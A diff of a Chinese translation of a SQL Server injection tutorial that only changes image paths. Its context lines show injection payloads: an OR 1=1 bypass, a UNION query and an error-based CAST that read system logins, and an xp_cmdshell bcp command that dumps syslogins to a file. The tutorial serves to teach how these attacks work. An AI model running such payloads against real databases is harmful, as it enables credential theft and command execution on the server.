@@ -71,7 +71,7 @@ EXEC dbo.USP_GetUserFullName @Username = N'BDubs'' OR 1=1--';
 EXEC dbo.USP_GetUserFullName @Username = N'BDubs'' UNION ALL SELECT loginname,null,null FROM master.sys.syslogins;--'; 
 ```
 
-[![](../Images/cbf7cfc1019d925968f77570fc28ed95.png)T2】](https://res.cloudinary.com/practicaldev/image/fetch/s--fwE8p6Q2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://bertwagner.com/wp-content/uploads/2018/11/image.png)
+[![](img/cbf7cfc1019d925968f77570fc28ed95.png)T2】](https://res.cloudinary.com/practicaldev/image/fetch/s--fwE8p6Q2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://bertwagner.com/wp-content/uploads/2018/11/image.png)
 
 这种基于联合的攻击只是将另一个查询的结果连接到我们的原始数据行。
 
@@ -87,7 +87,7 @@ EXEC dbo.USP_GetUserFullName @Username = N'BDubs'' UNION ALL SELECT loginname,nu
 EXEC dbo.USP_GetUserFullName @Username = N'''; SELECT CAST(SYSTEM_USER AS INT);--'; 
 ```
 
-[![](../Images/3afec6e8e6a1886a9ff631d5495dea8b.png)T2】](https://res.cloudinary.com/practicaldev/image/fetch/s--HgxhmW70--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://bertwagner.com/wp-content/uploads/2018/11/image-1.png)
+[![](img/3afec6e8e6a1886a9ff631d5495dea8b.png)T2】](https://res.cloudinary.com/practicaldev/image/fetch/s--HgxhmW70--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://bertwagner.com/wp-content/uploads/2018/11/image-1.png)
 
 瞧啊。如果应用程序没有正确处理错误消息，它会方便地将系统登录显示为错误消息的一部分。
 
@@ -103,7 +103,7 @@ EXEC dbo.USP_GetUserFullName @Username = N'''; SELECT CAST(SYSTEM_USER AS INT);-
 EXEC dbo.USP_GetUserFullName @Username = N'''; EXEC xp_cmdshell ''bcp "SELECT * FROM master.sys.syslogins" queryout "%TEMP%\pwned.txt" -c -T -q --'; 
 ```
 
-[![](../Images/6904b39d20257494b0effc3333d0eeca.png)T2】](https://res.cloudinary.com/practicaldev/image/fetch/s--JefFwVAC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://bertwagner.com/wp-content/uploads/2018/11/image-2.png)
+[![](img/6904b39d20257494b0effc3333d0eeca.png)T2】](https://res.cloudinary.com/practicaldev/image/fetch/s--JefFwVAC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://bertwagner.com/wp-content/uploads/2018/11/image-2.png)
 
 ## **盲目注射**
 
